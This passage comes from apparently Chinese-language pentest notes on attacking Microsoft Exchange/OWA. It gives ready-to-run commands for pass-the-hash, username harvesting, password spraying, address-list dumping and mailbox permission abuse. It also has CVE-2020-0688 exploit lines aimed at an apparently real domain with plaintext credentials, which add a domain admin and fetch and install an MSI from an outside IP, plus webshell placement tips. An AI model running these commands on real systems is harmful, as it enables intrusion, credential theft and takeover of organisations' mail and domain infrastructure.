class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;byt3bl33d3r&#x2F;CrackMapExec&#x2F;actions</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe --service-type smb -u jack -H 68F0D7B7EBD79E54F72C44FED3C74F89:30A96699356033B84283B8918A895D61 192.168.19.129</span><br></pre></td></tr></table></figure><h1 id="OWA"><a href="#OWA" class="headerlink" title="OWA"></a>OWA</h1><h3 id="版本查看"><a href="#版本查看" class="headerlink" title="版本查看"></a>版本查看</h3><p>首页查看源代码中包含版本号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;shortcut icon&quot; href&#x3D;&quot;&#x2F;owa&#x2F;auth&#x2F;15.0.1178&#x2F;themes&#x2F;resources&#x2F;favicon.ico&quot; type&#x3D;&quot;image&#x2F;x-icon&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;exchange&#x2F;new-features&#x2F;build-numbers-and-release-dates?view&#x3D;exchserver-2019</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">Exchange Server 2019 CU7 2020 年 9 月 15 日 15.2.721.2 15.02.0721.002</span><br><span class="line">Exchange Server 2019 CU6 2020 年 6 月 16 日 15.2.659.4 15.02.0659.004</span><br><span class="line">Exchange Server 2019 CU5 2020年3月17日 15.2.595.3 15.02.0595.003</span><br><span class="line">Exchange Server 2019 CU4 2019 年 12 月 17 日 15.2.529.5 15.02.0529.005</span><br><span class="line">Exchange Server 2019 CU3 2019 年 9 月 17 日 15.2.464.5 15.02.0464.005</span><br><span class="line">Exchange Server 2019 CU2 2019 年 6 月 18 日 15.2.397.3 15.02.0397.003</span><br><span class="line">Exchange Server 2019 CU1 2019 年 2 月 12 日 15.2.330.5 15.02.0330.005</span><br><span class="line">Exchange Server 2019 RTM 2018 年 10 月 22 日 15.2.221.12 15.02.0221.012</span><br><span class="line">Exchange Server 2019 Preview 2018 年 7 月 24 日 15.2.196.0 15.02.0196.000</span><br><span class="line">Exchange Server 2016 CU12 2019 年 2 月 12 日 15.1.1713.5 15.01.1713.005</span><br><span class="line">Exchange Server 2016 CU11 2018 年 10 月 16 日 15.1.1591.10 15.01.1591.010</span><br><span class="line">Exchange Server 2016 CU10 2018 年 6 月 19 日 15.1.1531.3 15.01.1531.003</span><br><span class="line">Exchange Server 2016 CU9 2018 年 3 月 20 日 15.1.1466.3 15.01.1466.003</span><br><span class="line">Exchange Server 2016 CU8 2017 年 12 月 19 日 15.1.1415.2 15.01.1415.002</span><br><span class="line">Exchange Server 2016 CU7 2017 年 9 月 19 日 15.1.1261.35 15.01.1261.035</span><br><span class="line">Exchange Server 2016 CU6 2017 年 6 月 27 日 15.1.1034.26 15.01.1034.026</span><br><span class="line">Exchange Server 2016 CU5 2017 年 3 月 21 日 15.1.845.34 15.01.0845.034</span><br><span class="line">Exchange Server 2016 CU4 2016 年 12 月 13 日 15.1.669.32 15.01.0669.032</span><br><span class="line">Exchange Server 2016 CU3 2016 年 9 月 20 日 15.1.544.27 15.01.0544.027</span><br><span class="line">Exchange Server 2016 CU2 2016 年 6 月 21 日 15.1.466.34 15.01.0466.034</span><br><span class="line">Exchange Server 2016 CU1 2016 年 3 月 15 日 15.1.396.30 15.01.0396.030</span><br><span class="line">Exchange Server 2016 RTM 2015 年 10 月 1 日 15.1.225.42 15.01.0225.042</span><br><span class="line">Exchange Server 2016 Preview 2015 年 7 月 22 日 15.1.225.16 15.01.0225.016</span><br><span class="line">Exchange Server 2013 CU22 2019 年 2 月 12 日 15.0.1473.3 15.00.1473.003</span><br><span class="line">Exchange Server 2013 CU21 2018 年 6 月 19 日 15.0.1395.4 15.00.1395.004</span><br><span class="line">Exchange Server 2013 CU20 2018 年 3 月 20 日 15.0.1367.3 15.00.1367.003</span><br><span class="line">Exchange Server 2013 CU19 2017 年 12 月 19 日 15.0.1365.1 15.00.1365.001</span><br><span class="line">Exchange Server 2013 CU18 2017 年 9 月 19 日 15.0.1347.2 15.00.1347.002</span><br><span class="line">Exchange Server 2013 CU17 2017 年 6 月 27 日 15.0.1320.4 15.00.1320.004</span><br><span class="line">Exchange Server 2013 CU16 2017 年 3 月 21 日 15.0.1293.2 15.00.1293.002</span><br><span class="line">Exchange Server 2013 CU15 2016 年 12 月 13 日 15.0.1263.5 15.00.1263.005</span><br><span class="line">Exchange Server 2013 CU14 2016 年 9 月 20 日 15.0.1236.3 15.00.1236.003</span><br><span class="line">Exchange Server 2013 CU13 2016 年 6 月 21 日 15.0.1210.3 15.00.1210.003</span><br><span class="line">Exchange Server 2013 CU12 2016 年 3 月 15 日 15.0.1178.4 15.00.1178.004</span><br><span class="line">Exchange Server 2013 CU11 2015 年 12 月 15 日 15.0.1156.6 15.00.1156.006</span><br><span class="line">Exchange Server 2013 CU10 2015 年 9 月 15 日 15.0.1130.7 15.00.1130.007</span><br><span class="line">Exchange Server 2013 CU9 2015 年 6 月 17 日 15.0.1104.5 15.00.1104.005</span><br><span class="line">Exchange Server 2013 CU8 2015 年 3 月 17 日 15.0.1076.9 15.00.1076.009</span><br><span class="line">Exchange Server 2013 CU7 2014 年 12 月 9 日 15.0.1044.25 15.00.1044.025</span><br><span class="line">Exchange Server 2013 CU6 2014 年 8 月 26 日 15.0.995.29 15.00.0995.029</span><br><span class="line">Exchange Server 2013 CU5 2014 年 5 月 27 日 15.0.913.22 15.00.0913.022</span><br><span class="line">Exchange Server 2013 SP1 2014 年 2 月 25 日 15.0.847.32 15.00.0847.032</span><br><span class="line">Exchange Server 2013 CU3 2013 年 11 月 25 日 15.0.775.38 15.00.0775.038</span><br><span class="line">Exchange Server 2013 CU2 2013 年 7 月 9 日 15.0.712.24 15.00.0712.024</span><br><span class="line">Exchange Server 2013 CU1 2013 年 4 月 2 日 15.0.620.29 15.00.0620.029</span><br><span class="line">Exchange Server 2013 RTM 2012 年 12 月 3 日 15.0.516.32 15.00.0516.032</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 26 2019 年 2 月 12 日 14.3.442.0 14.03.0442.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 25 2019 年 1 月 8 日 14.3.435.0 14.03.0435.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 24 2018 年 9 月 5 日 14.3.419.0 14.03.0419.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 23 2018 年 8 月 13 日 14.3.417.1 14.03.0417.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 22 2018 年 6 月 19 日 14.3.411.0 14.03.0411.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 21 2018 年 5 月 7 日 14.3.399.2 14.03.0399.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 20 2018 年 3 月 5 日 14.3.389.1 14.03.0389.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 19 2017 年 12 月 19 日 14.3.382.0 14.03.0382.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 18 2017 年 7 月 11 日 14.3.361.1 14.03.0361.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 17 2017 年 3 月 21 日 14.3.352.0 14.03.0352.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 16 2016 年 12 月 13 日 14.3.336.0 14.03.0336.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 15 2016 年 9 月 20 日 14.3.319.2 14.03.0319.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 14 2016 年 6 月 21 日 14.3.301.0 14.03.0301.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 13 2016 年 3 月 15 日 14.3.294.0 14.03.0294.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 12 2015 年 12 月 15 日 14.3.279.2 14.03.0279.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 11 2015 年 9 月 15 日 14.3.266.2 14.03.0266.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 10 2015 年 6 月 17 日 14.3.248.2 14.03.0248.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 9 2015 年 3 月 17 日 14.3.235.1 14.03.0235.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 8 v2 2014 年 12 月 12 日 14.3.224.2 14.03.0224.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 8 v1（已撤回） 2014 年 12 月 9 日 14.3.224.1 14.03.0224.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 7 2014 年 8 月 26 日 14.3.210.2 14.03.0210.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 6 2014 年 5 月 27 日 14.3.195.1 14.03.0195.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 5 2014 年 2 月 24 日 14.3.181.6 14.03.0181.006</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 4 2013 年 12 月 9 日 14.3.174.1 14.03.0174.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 3 2013 年 11 月 25 日 14.3.169.1 14.03.0169.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 2 2013 年 8 月 8 日 14.3.158.1 14.03.0158.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 1 2013 年 5 月 29 日 14.3.146.0 14.03.0146.000</span><br><span class="line">Exchange Server 2010 SP3 2013 年 2 月 12 日 14.3.123.4 14.03.0123.004</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 8 2013 年 12 月 9 日 14.2.390.3 14.02.0390.003</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 7 2013 年 8 月 3 日 14.2.375.0 14.02.0375.000</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 6 2013 年 2 月 12 日 14.2.342.3 14.02.0342.003</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 5 v2 2012 年 12 月 10 日 14.2.328.10 14.02.0328.010</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 5 2012 年 11 月 13 日 14.3.328.5 14.03.0328.005</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 4 v2 2012 年 10 月 9 日 14.2.318.4 14.02.0318.004</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 4 2012 年 8 月 13 日 14.2.318.2 14.02.0318.002</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 3 2012 年 5 月 29 日 14.2.309.2 14.02.0309.002</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 2 2012 年 4 月 16 日 14.2.298.4 14.02.0298.004</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 1 2012 年 2 月 13 日 14.2.283.3 14.02.0283.003</span><br><span class="line">Exchange Server 2010 SP2 2011 年 12 月 4 日 14.2.247.5 14.02.0247.005</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 8 2012 年 12 月 10 日 14.1.438.0 14.01.0438.000</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 7 v3 2012 年 11 月 13 日 14.1.421.3 14.01.0421.003</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 7 v2 2012 年 10 月 10 日 14.1.421.2 14.01.0421.002</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 7 2012 年 8 月 8 日 14.1.421.0 14.01.0421.000</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 6 2011 年 10 月 27 日 14.1.355.2 14.01.0355.002</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 5 2011 年 8 月 23 日 14.1.339.1 14.01.0339.001</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 4 2011 年 7 月 27 日 14.1.323.6 14.01.0323.006</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 3 2011 年 4 月 6 日 14.1.289.7 14.01.0289.007</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 2 2010 年 12 月 9 日 14.1.270.1 14.01.0270.001</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 1 2010 年 10 月 4 日 14.1.255.2 14.01.0255.002</span><br><span class="line">Exchange Server 2010 SP1 2010 年 8 月 23 日 14.1.218.15 14.01.0218.015</span><br><span class="line">Exchange Server 2010 更新汇总 5 2010 年 12 月 13 日 14.0.726.0 14.00.0726.000</span><br><span class="line">Exchange Server 2010 更新汇总 4 2010 年 6 月 10 日 14.0.702.1 14.00.0702.001</span><br><span class="line">Exchange Server 2010 更新汇总 3 2010 年 4 月 13 日 14.0.694.0 14.00.0694.000</span><br><span class="line">Exchange Server 2010 更新汇总 2 2010 年 3 月 4 日 14.0.689.0 14.00.0689.000</span><br><span class="line">Exchange Server 2010 更新汇总 1 2009 年 12 月 9 日 14.0.682.1 14.00.0682.001</span><br><span class="line">Exchange Server 2010 RTM 2009 年 11 月 9 日 14.0.639.21 14.00.0639.021</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 23 2017 年 3 月 21 日 8.3.517.0 8.03.0517.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 22 2016 年 12 月 13 日 8.3.502.0 8.03.0502.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 21 2016 年 9 月 20 日 8.3.485.1 8.03.0485.001</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 20 2016 年 6 月 21 日 8.3.468.0 8.03.0468.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 19 2016 年 3 月 15 日 8.3.459.0 8.03.0459.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 18 2015 年 12 月 8.3.445.0 8.03.0445.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 17 2015 年 6 月 17 日 8.3.417.1 8.03.0417.001</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 16 2015 年 3 月 17 日 8.3.406.0 8.03.0406.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 15 2014 年 12 月 9 日 8.3.389.2 8.03.0389.002</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 14 2014 年 8 月 26 日 8.3.379.2 8.03.0379.002</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 13 2014 年 2 月 24 日 8.3.348.2 8.03.0348.002</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 12 2013 年 12 月 9 日 8.3.342.4 8.03.0342.004</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 11 2013 年 8 月 13 日 8.3.327.1 8.03.0327.001</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 10 2013 年 2 月 11 日 8.3.298.3 8.03.0298.003</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 9 2012 年 12 月 10 日 8.3.297.2 8.03.0297.002</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 8-v3 2012 年 11 月 13 日 8.3.279.6 8.03.0279.006</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 8–v2 2012 年 10 月 9 日 8.3.279.5 8.03.0279.005</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 8 2012 年 8 月 13 日 8.3.279.3 8.03.0279.003</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 7 2012 年 4 月 16 日 8.3.264.0 8.03.0264.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 6 2012 年 1 月 26 日 8.3.245.2 8.03.0245.002</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 5 2011 年 9 月 21 日 8.3.213.1 8.03.0213.001</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 4 2011 年 5 月 28 日 8.3.192.1 8.03.0192.001</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 3-v2 2011 年 3 月 30 日 8.3.159.2 8.03.0159.002</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 2 2010 年 12 月 10 日 8.3.137.3 8.03.0137.003</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 1 2010 年 9 月 9 日 8.3.106.2 8.03.0106.002</span><br><span class="line">Exchange Server 2007 SP3 2010 年 6 月 7 日 8.3.83.6 8.03.0083.006</span><br></pre></td></tr></table></figure><h3 id="用户名爆破"><a href="#用户名爆破" class="headerlink" title="用户名爆破"></a>用户名爆破</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\MailSniper.ps1</span><br><span class="line">Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt</span><br></pre></td></tr></table></figure><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\MailSniper.ps1</span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile owa-sprayed-creds.txt</span><br><span class="line">Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile sprayed-ews-creds.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruler-win64.exe --domain mail.tfzq.com brute --users global-address-list.txt -p FastPwds.txt --delay 0 -v</span><br></pre></td></tr></table></figure><h3 id="导出联系人"><a href="#导出联系人" class="headerlink" title="导出联系人"></a>导出联系人</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\MailSniper.ps1</span><br><span class="line">Get-GlobalAddressList -ExchHostname mail.tfzq.com -UserName tfzq\tyservice -Password 2017TFzq -OutFile global-address-list.txt</span><br></pre></td></tr></table></figure><h3 id="遍历其它邮箱权限"><a href="#遍历其它邮箱权限" class="headerlink" title="遍历其它邮箱权限"></a>遍历其它邮箱权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\MailSniper.ps1</span><br><span class="line">Invoke-OpenInboxFinder -EmailList global-address-list.txt -ExchHostname mail.tfzq.com -Remote</span><br></pre></td></tr></table></figure><h3 id="授权用户可打开其他邮箱"><a href="#授权用户可打开其他邮箱" class="headerlink" title="授权用户可打开其他邮箱"></a>授权用户可打开其他邮箱</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.powershellgallery.com/packages/ExchangeOnlineManagement/2.0.3</span><br><span class="line">Install-Package https://psg-prod-eastus.azureedge.net/packages/exchangeonlinemanagement.2.0.3.nupkg</span><br><span class="line">Install-Module -Name ExchangeOnlineManagement -RequiredVersion 2.0.3</span><br><span class="line"></span><br><span class="line">在exchange的管理shell中执行</span><br><span class="line">Get-Mailbox -ResultSize unlimited -Filter &#123;(RecipientTypeDetails -eq <span class="string">&#x27;UserMailbox&#x27;</span>) -and (Alias -ne <span class="string">&#x27;Admin&#x27;</span>)&#125; | Add-MailboxPermission -User Administrator@jj.local -AccessRights fullaccess -InheritanceType all</span><br></pre></td></tr></table></figure><h3 id="CVE-2020-16875"><a href="#CVE-2020-16875" class="headerlink" title="CVE-2020-16875"></a>CVE-2020-16875</h3><p>条件：任意可登录邮箱的账号密码</p><p>效果：RCE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">影响范围:</span><br><span class="line">Microsoft Exchange Server 2016 Cumulative Update 16</span><br><span class="line">Microsoft Exchange Server 2016 Cumulative Update 17</span><br><span class="line">Microsoft Exchange Server 2019 Cumulative Update 5</span><br><span class="line">Microsoft Exchange Server 2019 Cumulative Update 6</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploit-framework&#x2F;pull&#x2F;14126</span><br><span class="line">https:&#x2F;&#x2F;srcincite.io&#x2F;pocs&#x2F;cve-2020-16875.py.txt</span><br></pre></td></tr></table></figure><h3 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h3><p>条件：任意可登录邮箱的账号密码</p><p>效果：反序列化RCE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">影响范围:</span><br><span class="line">Microsoft Exchange Server 2010 Service Pack 3</span><br><span class="line">Microsoft Exchange Server 2013</span><br><span class="line">Microsoft Exchange Server 2016</span><br><span class="line">Microsoft Exchange Server 2019</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;cve-2020-0688</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zcgonvh&#x2F;CVE-2020-0688</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">py3 cve-2020-0688.py -s https:&#x2F;&#x2F;mail.tfzq.com&#x2F;owa -u tfzq\tyservice -p 2017TFzq -c &quot;ping bo3s1v.dnslog.cn&quot;</span><br><span class="line">py3 cve-2020-0688.py -s https:&#x2F;&#x2F;mail.tfzq.com&#x2F;owa -u tfzq\tyservice -p 2017TFzq -c &quot;net user aspnet 1qaz@WSXX &#x2F;add &#x2F;domain&quot;</span><br><span class="line">py3 cve-2020-0688.py -s https:&#x2F;&#x2F;mail.tfzq.com&#x2F;owa -u tfzq\tyservice -p 2017TFzq -c &quot;net group \&quot;domain admins\&quot; tyservice &#x2F;add &#x2F;domain&quot;</span><br><span class="line">py3 cve-2020-0688.py -s https:&#x2F;&#x2F;mail.tfzq.com&#x2F;owa -u tfzq\tyservice -p 2017TFzq -c &quot;msiexec &#x2F;passive &#x2F;i http:&#x2F;&#x2F;39.98.227.230:8000&#x2F;install.msi&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20201216132604741.png" alt="image-20201216132604741"></p><p><img src="/images/image-20201216132623934.png" alt="image-20201216132623934"></p><p><img src="/images/image-20201216132643457.png" alt="image-20201216132643457"></p><p><img src="/images/image-20201216132515350.png" alt="image-20201216132515350"></p><h3 id="webshell-路径"><a href="#webshell-路径" class="headerlink" title="webshell 路径"></a>webshell 路径</h3><p>写shell注意几点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;ecp&#x2F;目录下不是所有文件名都可以，要在&#x2F;ecp&#x2F;web.config中定义了的才行，一般使用 LiveIdError.aspx OrgIdError.aspx</span><br><span class="line">&#x2F;ecp&#x2F;目录需要登录后的Cookie</span><br><span class="line">webshell不能用冰蝎、天蝎，要用蚁剑原始shell，上传后可在文件编辑中替换为xor版本</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">handlers</span> <span class="attr">accessPolicy</span>=<span class="string">&quot;Read, Script&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;DownloadHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;Download.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;GET,POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Microsoft.Exchange.Management.ControlPanel.DownloadHandler&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;ProxyLogonHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;proxyLogon.ecp&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Microsoft.Exchange.Management.ControlPanel.ProxyLogonHandler&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;LiveIdErrorHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;LiveIdError.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;EducationPage&quot;</span> <span class="attr">path</span>=<span class="string">&quot;Education.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;OrgIdErrorHandler&quot;</span> <span class="attr">path</span>=<span class="string">&quot;OrgIdError.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">type</span>=<span class="string">&quot;System.Web.UI.PageHandlerFactory&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;integratedMode&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;PageHandlerFactory-Integrated&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*.aspx&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;GET&quot;</span> <span 